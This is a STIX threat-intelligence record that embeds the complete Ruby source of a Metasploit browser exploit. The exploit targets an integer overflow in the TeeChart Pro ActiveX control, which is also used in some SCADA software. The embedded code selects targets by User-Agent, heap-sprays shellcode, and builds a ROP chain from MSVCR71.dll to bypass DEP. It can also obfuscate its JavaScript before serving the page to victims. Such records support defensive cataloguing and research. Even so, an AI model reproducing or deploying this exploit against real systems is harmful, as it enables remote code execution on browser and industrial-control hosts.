{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--822c07d7-4e93-4a9d-9848-ad4cac71ff7e",
    "created": "2024-08-14T16:43:12.100935Z",
    "modified": "2024-08-14T16:43:12.100939Z",
    "name": "TeeChart Professional ActiveX Control Trusted Integer Dereference",
    "description": " This module exploits an integer overflow in TeeChart Pro ActiveX control. When sending an overly large/negative integer value to the AddSeries() property of TeeChart2010.ocx, the code will perform an arithmetic operation that wraps the value and is later directly trusted and called upon.  This module has been designed to bypass DEP only under IE8 with Java support. Multiple versions (including the latest version) are affected by this vulnerability that date back to as far as 2001.  The following controls are vulnerable:  TeeChart5.ocx Version 5.0.1.0 (clsid: B6C10489-FB89-11D4-93C9-006008A7EED4); TeeChart6.ocx Version 6.0.0.5 (clsid: 536600D3-70FE-4C50-92FB-640F6BFC49AD); TeeChart7.ocx Version 7.0.1.4 (clsid: FAB9B41C-87D6-474D-AB7E-F07D78F2422E); TeeChart8.ocx Version 8.0.0.8 (clsid: BDEB0088-66F9-4A55-ABD2-0BF8DEEC1196); TeeChart2010.ocx Version 2010.0.0.3 (clsid: FCB4B50A-E3F1-4174-BD18-54C3B3287258).  The controls are deployed under several SCADA based systems including:  Unitronics OPC server v1.3; BACnet Operator Workstation Version 1.0.76  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/teechart_pro.rb",
            "external_id": "teechart_pro.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.stratsec.net/Research/Advisories/TeeChart-Professional-Integer-Overflow"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super( update_info(info,\n      'Name'           => 'TeeChart Professional ActiveX Control Trusted Integer Dereference',\n      'Description'    => %q{\n          This module exploits an integer overflow in TeeChart Pro ActiveX control. When\n        sending an overly large/negative integer value to the AddSeries() property of\n        TeeChart2010.ocx, the code will perform an arithmetic operation that wraps the\n        value and is later directly trusted and called upon.\n\n        This module has been designed to bypass DEP only under IE8 with Java support. Multiple\n        versions (including the latest version) are affected by this vulnerability that date\n        back to as far as 2001.\n\n        The following controls are vulnerable:\n\n        TeeChart5.ocx Version 5.0.1.0 (clsid: B6C10489-FB89-11D4-93C9-006008A7EED4);\n        TeeChart6.ocx Version 6.0.0.5 (clsid: 536600D3-70FE-4C50-92FB-640F6BFC49AD);\n        TeeChart7.ocx Version 7.0.1.4 (clsid: FAB9B41C-87D6-474D-AB7E-F07D78F2422E);\n        TeeChart8.ocx Version 8.0.0.8 (clsid: BDEB0088-66F9-4A55-ABD2-0BF8DEEC1196);\n        TeeChart2010.ocx Version 2010.0.0.3 (clsid: FCB4B50A-E3F1-4174-BD18-54C3B3287258).\n\n        The controls are deployed under several SCADA based systems including:\n\n        Unitronics OPC server v1.3;\n        BACnet Operator Workstation Version 1.0.76\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          # twitter.com/net__ninja\n          'mr_me <steventhomasseeley[at]gmail.com>', # initial discovery/msf module\n          'sinn3r', #Auto target, obfuscation, lots of testing\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '74446'],\n          [ 'URL', 'http://www.stratsec.net/Research/Advisories/TeeChart-Professional-Integer-Overflow'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          # For exploitation we need to calculate a value for EDX:\n          # <target address> - EAX / 4 = address to place in edx via signed integar\n          # 0x0c0c0c0c - 0x023FB8F4 = 0x09CC5318 / 4 = 0x027314C6 = decimal: 41096390\n          [\n            'Windows XP SP0-SP3 (IE6/IE7)',\n            {\n              'Ret' => 0x027314C6\n            }\n          ],\n          # Windows XP target + IE8 + JAVA = ASLR/DEP Bypass\n          # 0x09442020- 0x0326B8F4 = 61D672C/4 = 18759CB\n          [\n            'Windows XP SP0-SP3 + JAVA + DEP bypass (IE8)',\n            {\n              'Ret' => 0x014E59CB,\n              # 0x09442020-0x2c+4 (compensate for CALL [EAX+2C] + 1st gadget) = 0x09441FF8\n              # get back to the 2nd of rop.\n              'Pivot' => 0x09441FF8\n            }\n          ],\n          # Windows 7 target + IE8 + JAVA = ASLR/DEP Bypass\n          # 0x16672020 - 0x040AB8F4/4 =  0x049719CB\n          [\n            'Windows 7 + JAVA + DEP bypass (IE8)',\n            {\n              'Ret' => 0x049719CB,\n              # 0x16672020-0x2c+4 (compensate for CALL [EAX+2C] + 1st gadget) = 0x16671FF8\n              # get back to the 2nd of rop.\n              'Pivot' => 0x16671FF8\n            }\n          ]\n        ],\n      'DisclosureDate' => '2011-08-11',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript Obfuscation', true])\n      ])\n  end\n\n  def junk\n    return rand_text_alpha(4).unpack(\"L\")[0].to_i\n  end\n\n  def on_request_uri(cli, request)\n    #Set target manually or automatically\n    my_target = target\n    if my_target.name == 'Automatic'\n      agent = request.headers['User-Agent']\n      if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6\\.0/\n        my_target = targets[1]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/\n        my_target = targets[1]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8\\.0/\n        my_target = targets[2]\n      elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8\\.0/\n        my_target = targets[3]\n      end\n    end\n\n    vprint_status(\"Target selected: #{my_target.name}\")\n\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # align stack\n    retn = Rex::Text.to_unescape([0x7C3410C4].pack('V*'))\n    pop_pop_retn = Rex::Text.to_unescape([0x7C3410C2].pack('V*'))\n\n    # shellcode\n    sc = Rex::Text.to_unescape(p.encoded)\n\n    # Randomize object name\n    obj_name  = rand_text_alpha(rand(100) + 1)\n    main_sym  = 'main' #main function name\n\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    if my_target.name =~ /IE6/ or my_target.name =~ /IE7/\n      js = <<-EOS\nvar sc = unescape('#{sc}');\n\nvar #{randnop} = \"%u0c0c%u0c0c\";\nvar nops = unescape(#{randnop});\nvar offset = 20;\nvar s = offset + sc.length;\nwhile(nops.length < s) {\n  nops += nops;\n}\nvar chunk1 = nops.substring(0, s);\nvar chunk2 = nops.substring(0, nops.length - s);\nwhile((chunk2.length + s) < 0x50000) {\n  chunk2 = chunk2 + chunk2 + chunk1;\n}\nvar blocks = new Array();\nfor(var counter=0; counter<200; counter++){\n  blocks[counter] = chunk2 + sc;\n}\n\nfunction main()\n{\n  #{obj_name}.AddSeries(#{my_target.ret});\n}\nEOS\n    end\n\n    #http://vreugdenhilresearch.nl/Pwn2Own-2010-Windows7-InternetExplorer8.pdf\n    if my_target.name =~ /IE8/\n      # thanks to corelanc0d3r & mona.py :^) for the universal aslr/dep bypass (msvcr71.dll)\n      # https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/\n      rop_gadgets = [\n        my_target['Pivot'],# Pivot back EAX for ESP control\n        0x7C342643,  # XCHG EAX,ESP; POP EDI; ; ADD BYTE PTR DS:[EAX],AL; POP ECX; RETN\n        0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n        0x7c37a140,  # Make EAX readable\n        0x7c37591f,  # PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)\n        0x41414141,  # EBP (filler)\n        0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n        0x7c37a140,  # <- *&VirtualProtect()\n        0x7c3530ea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)\n        0x7c346c0b,  # Slide, so next gadget would write to correct stack location\n        0x7c376069,  # MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)\n        0x41414141,  # EDI (filler)\n        0x41414141,  # will be patched at runtime (VP), then picked up into ESI\n        0x41414141,  # EBX (filler)\n        0x7c376402,  # POP EBP # RETN (msvcr71.dll)\n        0x7c345c30,  # ptr to 'push esp #  ret ' (from MSVCR71.dll)\n        0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n        0xfffffdff,  # size 0x00000201 -> ebx, modify if needed\n        0x7c351e05,  # NEG EAX # RETN (MSVCR71.dll)\n        0x7c354901,  # POP EBX # RETN (MSVCR71.dll)\n        0xffffffff,  # pop value into ebx\n        0x7c345255,  # INC EBX # FPATAN # RETN (MSVCR71.dll)\n        0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)\n        0x7c34d201,  # POP ECX # RETN (MSVCR71.dll)\n        0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)\n        0x7c34b8d7,  # POP EDI # RETN (MSVCR71.dll)\n        0x7c34b8d8,  # ROP NOP (-> edi)\n        0x7c344f87,  # POP EDX # RETN (MSVCR71.dll)\n        0xffffffc0,  # value to negate, target value : 0x00000040, target: edx\n        0x7c351eb1,  # NEG EDX # RETN (MSVCR71.dll)\n        0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n        0x90909090,  # NOPS (-> eax)\n        0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)\n      ].pack('V*')\n\n      rop = Rex::Text.to_unescape(rop_gadgets)\n\n      custom_js = <<-EOF\n      function heapspray(){\n        var heapLib = new heapLib.ie(0x20000);\n        var payload = unescape('#{rop}');\n        payload += unescape('#{sc}');\n        while(payload.length <= 0xffc) payload += unescape('#{retn}')\n        while(payload.length < 0x1000) payload += unescape('#{pop_pop_retn}')\n        var data = payload;\n        while(data.length < 0x40000) data += data;\n        var block = data.substring(2, 0x40000 - 0x21);\n        for(var i = 0; i < 0x400; i++) {\n          heapLib.alloc(block);\n        }\n      }\n\n      function main(){\n        heapspray();\n        #{obj_name}.AddSeries(#{my_target.ret});\n      }\n      EOF\n\n      js = heaplib(custom_js)\n\n      #JS obfuscation on demand\n      if datastore['OBFUSCATE']\n        js = ::Rex::Exploitation::JSObfu.new(js)\n        js.obfuscate(memory_sensitive: true)\n        main_sym = js.sym('main')\n      end\n    end\n\n    content = <<-EOF\n    <object classid='clsid:FCB4B50A-E3F1-4174-BD18-54C3B3287258' id='#{obj_name}' ></object>\n    <script language='JavaScript' defer>\n    #{js}\n    </script>\n    <body onload=\"#{main_sym}();\">\n    <body>\n    </html>\n    EOF\n\n\n    print_status(\"Sending #{self.name}\")\n\n    #Remove the extra tabs from content\n    content = content.gsub(/^ {4}/, '')\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-08-11",
    "x_mitre_platforms": [
        "win'"
    ]
}